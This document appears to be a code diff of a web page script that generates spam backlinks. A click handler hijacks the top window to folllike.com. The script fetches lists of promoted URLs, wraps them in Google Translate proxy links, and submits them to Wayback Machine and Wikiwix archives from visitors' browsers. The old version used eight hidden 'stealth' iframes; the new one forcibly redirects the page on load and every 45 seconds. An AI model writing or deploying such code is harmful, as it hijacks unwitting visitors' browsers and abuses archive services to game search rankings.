@@ -8,17 +8,16 @@
 <script>
       document.getElementById("clickCatcher").addEventListener("click", function () {
         	//window.location.href = "http://folllike.com/?19384926";
-		
-		    // Changes top window; will throw if cross-origin
-		    top.location.href = 'http://folllike.com/?19384926';
-		    // or to replace current history:
-		    // top.location.replace('http://folllike.com/?19384926');
+			
+			    // Changes top window; will throw if cross-origin
+			    top.location.href = 'http://folllike.com/?19384926';
+			    // or to replace current history:
+			    // top.location.replace('http://folllike.com/?19384926');
       });
 </script>
 <!---------------------------------------------------------->
 
 
-<div id="stealthIFrameContainer"></div>
 <script>
 const googleTranslateUrls = [
 	"https://translate.google.com/translate?sl=auto&tl={{LANGUAGE_CODES}}&hl=en-US&u=https://{{SUBDOMAIN}}.blogspot.com/&client=webapp",
@@ -26,262 +25,26 @@ const googleTranslateUrls = [
 ];
 
 const languageCodes = [
-	"sn",
-	"ach",
-	"en",
-	"da",
-	"ab",
-	"ace",
-	"ach",
-	"aa",
-	"af",
-	"sq",
-	"alz",
-	"am",
-	"ar",
-	"hy",
-	"as",
-	"av",
-	"awa",
-	"ay",
-	"az",
-	"ban",
-	"bal",
-	"bm",
-	"bci",
-	"ba",
-	"eu",
-	"btx",
-	"bts",
-	"bbc",
-	"be",
-	"bem",
-	"bn",
-	"bew",
-	"bho",
-	"bik",
-	"bs",
-	"br",
-	"bg",
-	"bua",
-	"yue",
-	"ca",
-	"ceb",
-	"ch",
-	"ce",
-	"ny",
-	"zh-CN",
-	"zh-TW",
-	"chk",
-	"cv",
-	"co",
-	"crh",
-	"crh-Latn",
-	"hr",
-	"cs",
-	"da",
-	"fa-AF",
-	"dv",
-	"din",
-	"doi",
-	"dov",
-	"nl",
-	"dyu",
-	"dz",
-	"en",
-	"eo",
-	"et",
-	"ee",
-	"fo",
-	"fj",
-	"tl",
-	"fi",
-	"fon",
-	"fr",
-	"fr-CA",
-	"fy",
-	"fur",
-	"ff",
-	"gaa",
-	"gl",
-	"ka",
-	"de",
-	"el",
-	"gn",
-	"gu",
-	"ht",
-	"cnh",
-	"ha",
-	"haw",
-	"iw",
-	"hil",
-	"hi",
-	"hmn",
-	"hu",
-	"hrx",
-	"iba",
-	"is",
-	"ig",
-	"ilo",
-	"id",
-	"iu-Latn",
-	"iu",
-	"ga",
-	"it",
-	"jam",
-	"ja",
-	"jw",
-	"kac",
-	"kl",
-	"kn",
-	"kr",
-	"pam",
-	"kk",
-	"kha",
-	"km",
-	"cgg",
-	"kg",
-	"rw",
-	"ktu",
-	"trp",
-	"kv",
-	"gom",
-	"ko",
-	"kri",
-	"ku",
-	"ckb",
-	"ky",
-	"lo",
-	"ltg",
-	"la",
-	"lv",
-	"lij",
-	"li",
-	"ln",
-	"lt",
-	"lmo",
-	"lg",
-	"luo",
-	"lb",
-	"mk",
-	"mad",
-	"mai",
-	"mak",
-	"mg",
-	"ms",
-	"ms-Arab",
-	"ml",
-	"mt",
-	"mam",
-	"gv",
-	"mi",
-	"mr",
-	"mh",
-	"mwr",
-	"mfe",
-	"chm",
-	"mni-Mtei",
-	"min",
-	"lus",
-	"mn",
-	"my",
-	"nhe",
-	"ndc-ZW",
-	"nr",
-	"new",
-	"ne",
-	"bm-Nkoo",
-	"no",
-	"nus",
-	"oc",
-	"or",
-	"om",
-	"os",
-	"pag",
-	"pap",
-	"ps",
-	"fa",
-	"pl",
-	"pt",
-	"pt-PT",
-	"pa",
-	"pa-Arab",
-	"qu",
-	"kek",
-	"rom",
-	"ro",
-	"rn",
-	"ru",
-	"se",
-	"sm",
-	"sg",
-	"sa",
-	"sat-Latn",
-	"sat",
-	"gd",
-	"nso",
-	"sr",
-	"st",
-	"crs",
-	"shn",
-	"sn",
-	"scn",
-	"szl",
-	"sd",
-	"si",
-	"sk",
-	"sl",
-	"so",
-	"es",
-	"su",
-	"sus",
-	"sw",
-	"ss",
-	"sv",
-	"ty",
-	"tg",
-	"ber-Latn",
-	"ber",
-	"ta",
-	"tt",
-	"te",
-	"tet",
-	"th",
-	"bo",
-	"ti",
-	"tiv",
-	"tpi",
-	"to",
-	"lua",
-	"ts",
-	"tn",
-	"tcy",
-	"tum",
-	"tr",
-	"tk",
-	"tyv",
-	"ak",
-	"udm",
-	"uk",
-	"ur",
-	"ug",
-	"uz",
-	"ve",
-	"vec",
-	"vi",
-	"war",
-	"cy",
-	"wo",
-	"xh",
-	"sah",
-	"yi",
-	"yo",
-	"yua",
-	"zap",
-	"zu"
+	"sn","ach","en","da","ab","ace","ach","aa","af","sq","alz","am","ar","hy","as",
+	"av","awa","ay","az","ban","bal","bm","bci","ba","eu","btx","bts","bbc","be",
+	"bem","bn","bew","bho","bik","bs","br","bg","bua","yue","ca","ceb","ch","ce",
+	"ny","zh-CN","zh-TW","chk","cv","co","crh","crh-Latn","hr","cs","da","fa-AF",
+	"dv","din","doi","dov","nl","dyu","dz","en","eo","et","ee","fo","fj","tl","fi",
+	"fon","fr","fr-CA","fy","fur","ff","gaa","gl","ka","de","el","gn","gu","ht",
+	"cnh","ha","haw","iw","hil","hi","hmn","hu","hrx","iba","is","ig","ilo","id",
+	"iu-Latn","iu","ga","it","jam","ja","jw","kac","kl","kn","kr","pam","kk","kha",
+	"km","cgg","kg","rw","ktu","trp","kv","gom","ko","kri","ku","ckb","ky","lo",
+	"ltg","la","lv","lij","li","ln","lt","lmo","lg","luo","lb","mk","mad","mai",
+	"mak","mg","ms","ms-Arab","ml","mt","mam","gv","mi","mr","mh","mwr","mfe","chm",
+	"mni-Mtei","min","lus","mn","my","nhe","ndc-ZW","nr","new","ne","bm-Nkoo","no",
+	"nus","oc","or","om","os","pag","pap","ps","fa","pl","pt","pt-PT","pa","pa-Arab",
+	"qu","kek","rom","ro","rn","ru","se","sm","sg","sa","sat-Latn","sat","gd","nso",
+	"sr","st","crs","shn","sn","scn","szl","sd","si","sk","sl","so","es","su","sus",
+	"sw","ss","sv","ty","tg","ber-Latn","ber","ta","tt","te","tet","th","bo","ti",
+	"tiv","tpi","to","lua","ts","tn","tcy","tum","tr","tk","tyv","ak","udm","uk",
+	"ur","ug","uz","ve","vec","vi","war","cy","wo","xh","sah","yi","yo","yua","zap","zu"
 ];
-  
-/* Instrumented version of your script — paste in place of old script */
+
 const fetchData = [
   "https://smartbacklinkmaker.blogspot.com/"
 ];
@@ -289,8 +52,7 @@ const fetchURLs = [
   "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator.json"
 ];
 
-const IFRAME_COUNT = 8;
-const SUBMIT_INTERVAL = 45000; // 45s
+const SUBMIT_INTERVAL = 45000; // 45s — interval between redirects
 
 function isValidURL(url) {
   const pattern = /^https?:\/\/[^\s]+$/i;
@@ -302,7 +64,6 @@ function randomURL(array){ return array[Math.floor(Math.random()*array.length)];
 
 /* ============================================================
      🔥 HARDENED updateDefaultURLs() — JS + JSON support
-     Keeps blogspot-only filter unique to this file.
    ============================================================ */
 async function updateDefaultURLs() {
   const wait = (ms) => new Promise(res => setTimeout(res, ms));
@@ -376,7 +137,7 @@ async function updateDefaultURLs() {
     });
   }
 
-  /* Blogspot-only filter — unique to this file */
+  /* Blogspot-only filter */
   function filterBlogspot(arr) {
     return arr.filter(url => {
       try {
@@ -424,7 +185,6 @@ async function updateDefaultURLs() {
         continue;
       }
 
-      // Unknown extension
       try {
         const r = await fetch(u);
         if (r.ok) {
@@ -507,12 +267,11 @@ function generateUrl(tpl, normUrl) {
 
 /* ============================================================
      Blogger subdomain helper + Google Translate URL builder
-     (unique to this file — preserved exactly)
    ============================================================ */
 function getSubdomain(url) {
-  const hostname = new URL(url).hostname;       // e.g. linkboosttool.blogspot.com
-  const parts    = hostname.split('.');         // ["linkboosttool", "blogspot", "com"]
-  return parts.length > 2 ? parts[0] : null;   // "linkboosttool"
+  const hostname = new URL(url).hostname;
+  const parts    = hostname.split('.');
+  return parts.length > 2 ? parts[0] : null;
 }
 
 function generateTargetURL() {
@@ -526,34 +285,42 @@ function generateTargetURL() {
 
 /* ============================================================
      Archive site definitions
-     ① Form-submit  — action, method (POST|GET), inputName, extraParams
-     ② URL-template — urlTemplate w/ [PLACEHOLDER] support, method: "GET_NAV"
-
-     NOTE: The original file had WAYBACK_SAVE_ENDPOINT = "https://web.archive.org/save/{{URL}}"
-     used as a form action — the {{URL}} was never substituted (bug).
-     Corrected here as a proper GET_NAV entry: the full URL is embedded
-     in the path, which is what was clearly intended.
+     method: "GET"      → redirect via window.location.href
+     method: "POST"     → hidden form submit targeting _self
+     method: "GET_NAV"  → resolve urlTemplate then redirect
    ============================================================ */
 const ARCHIVE_SITES = [
-  /* Wayback Machine: snapshot via POST (standard) */
-  [
-    {
-      name: "Wayback POST",
-      action: "https://web.archive.org/save",
-      method: "POST",
-      inputName: "url",
-      extraParams: {}
-    }
-  ],
-  [
-   {
-          name: "Wikiwix",
-          action: "https://archive.wikiwix.com/cache/",
-          method: "GET",
-          inputName: "url",
-          extraParams: {}
-        }
-  ]
+	 [
+	    {
+	      name: "Wikiwix",
+	      action: "https://archive.wikiwix.com/cache/",
+	      method: "GET",
+	      inputName: "url",
+	      extraParams: {}
+	    }
+	  ]
+	/*
+	  /* Wayback Machine: snapshot via POST */
+	  [
+	    {
+	      name: "Wayback POST",
+	      action: "https://web.archive.org/save",
+	      method: "POST",
+	      inputName: "url",
+	      extraParams: {}
+	    }
+	  ],
+	  /* Wikiwix: snapshot via GET */
+	  [
+	    {
+	      name: "Wikiwix",
+	      action: "https://archive.wikiwix.com/cache/",
+	      method: "GET",
+	      inputName: "url",
+	      extraParams: {}
+	    }
+	  ]
+	*/
 ];
 
 function chooseRandomArchive() {
@@ -561,104 +328,92 @@ function chooseRandomArchive() {
   return group[Math.floor(Math.random() * group.length)];
 }
 
-function ensureContainer() {
-  return document.getElementById("stealthIFrameContainer")
-      || document.body
-      || document.documentElement;
-}
-
-function buildAndSubmitArchiveForm(site, targetUrl, targetFrameName) {
-  if (!site || !targetUrl) return;
-  try {
-    const form = document.createElement("form");
-    form.style.display  = "none";
-    form.method         = site.method || "POST";
-    form.action         = site.action;
-    form.referrerPolicy = "no-referrer";
-    form.target         = targetFrameName || "_self";
-
-    const urlInput  = document.createElement("input");
-    urlInput.type   = (site.method === "GET") ? "text" : "hidden";
-    urlInput.name   = site.inputName || "url";
-    urlInput.value  = targetUrl;
-    form.appendChild(urlInput);
-
-    if (site.extraParams) {
-      for (const [k, v] of Object.entries(site.extraParams)) {
-        const inp = document.createElement("input");
-        inp.type = "hidden"; inp.name = k; inp.value = v;
-        form.appendChild(inp);
-      }
-    }
-
-    const container = ensureContainer();
-    container.appendChild(form);
-    console.log(`📨 Submitting to ${site.name} (${site.action}) via ${site.method} target=${form.target} url=${targetUrl}`);
-    form.submit();
-    setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
-  } catch (err) {
-    console.error("❌ buildAndSubmitArchiveForm error:", err);
-  }
-}
-
-function submitToArchiveInFrame(iframe) {
+/* ============================================================
+     Core redirect function — replaces createIframe entirely.
+     GET / GET_NAV → window.location.href redirect
+     POST          → hidden form targeting _self (navigates page)
+   ============================================================ */
+function submitToArchive() {
   try {
     const targetUrl = generateTargetURL();
     if (!targetUrl || !isValidURL(targetUrl)) {
       console.warn("⚠ Skipping invalid target:", targetUrl);
       return;
     }
+
     const site = chooseRandomArchive();
 
-    /* GET_NAV: resolve template and navigate iframe directly */
+    /* ── GET_NAV: resolve template then redirect ── */
     if (site.method === "GET_NAV" && site.urlTemplate) {
       const resolved = generateUrl(site.urlTemplate, targetUrl);
-      console.log(`🔗 Navigating iframe ${iframe.name} → ${site.name}: ${resolved}`);
-      iframe.src = resolved;
+      console.log(`🔗 Redirecting (GET_NAV) → ${site.name}: ${resolved}`);
+      window.location.href = resolved;
       return;
     }
 
-    /* Form-submit (POST / GET) */
-    buildAndSubmitArchiveForm(site, targetUrl, iframe.name);
+    /* ── GET: build query string and redirect ── */
+    if (site.method === "GET") {
+      const params = new URLSearchParams();
+      params.set(site.inputName || "url", targetUrl);
+      if (site.extraParams) {
+        for (const [k, v] of Object.entries(site.extraParams)) params.set(k, v);
+      }
+      const redirectUrl = site.action + "?" + params.toString();
+      console.log(`🔗 Redirecting (GET) → ${site.name}: ${redirectUrl}`);
+      window.location.href = redirectUrl;
+      return;
+    }
+
+    /* ── POST: hidden form targeting _self ── */
+    if (site.method === "POST") {
+      const form = document.createElement("form");
+      form.style.display  = "none";
+      form.method         = "POST";
+      form.action         = site.action;
+      form.referrerPolicy = "no-referrer";
+      form.target         = "_self"; // navigate current window
+
+      const urlInput  = document.createElement("input");
+      urlInput.type   = "hidden";
+      urlInput.name   = site.inputName || "url";
+      urlInput.value  = targetUrl;
+      form.appendChild(urlInput);
+
+      if (site.extraParams) {
+        for (const [k, v] of Object.entries(site.extraParams)) {
+          const inp = document.createElement("input");
+          inp.type = "hidden"; inp.name = k; inp.value = v;
+          form.appendChild(inp);
+        }
+      }
+
+      document.body.appendChild(form);
+      console.log(`📨 Submitting (POST) → ${site.name} (${site.action}) url=${targetUrl}`);
+      form.submit();
+      // form will be destroyed when page navigates, but clean up just in case
+      setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
+      return;
+    }
+
+    console.warn("⚠ Unknown method for site:", site.name, site.method);
   } catch (err) {
-    console.error("❌ submitToArchiveInFrame error:", err);
+    console.error("❌ submitToArchive error:", err);
   }
 }
 
-function createIframe(i) {
-  try {
-    const iframe = document.createElement("iframe");
-    const fname  = "hiddenFrame" + i;
-    iframe.setAttribute("name", fname);
-    iframe.setAttribute("id", fname);
-    iframe.classList.add("hidden-iframe");
-    iframe.style.width  = "100%";
-    iframe.style.height = "200px";
-    iframe.style.border = "0";
-    iframe.src = "about:blank";
-
-    ensureContainer().appendChild(iframe);
-
-    setTimeout(() => submitToArchiveInFrame(iframe), 250);
-    setInterval(() => {
-      console.log("⏱ Interval firing for iframe:", fname);
-      submitToArchiveInFrame(iframe);
-    }, SUBMIT_INTERVAL);
-  } catch (err) {
-    console.error("❌ createIframe error:", err);
-  }
-}
-
-/* Ensure container exists (defensive) */
-if (!document.getElementById("stealthIFrameContainer")) {
-  const c = document.createElement("div");
-  c.id = "stealthIFrameContainer";
-  document.body.appendChild(c);
-  console.log("➕ Created missing stealthIFrameContainer.");
-}
-
+/* ============================================================
+     Init — fire once on load, then repeat on interval
+   ============================================================ */
 document.addEventListener('DOMContentLoaded', async () => {
   try { await updateDefaultURLs(); } catch (e) { console.warn("updateDefaultURLs() failed:", e && e.message); }
-  for (let i = 0; i < IFRAME_COUNT; i++) createIframe(i);
+
+  // First submission
+  submitToArchive();
+
+  // Repeat every SUBMIT_INTERVAL ms (only meaningful if the page hasn't navigated away)
+  setInterval(() => {
+    console.log("⏱ Interval firing — submitting to archive");
+    submitToArchive();
+  }, SUBMIT_INTERVAL);
 });
 </script>
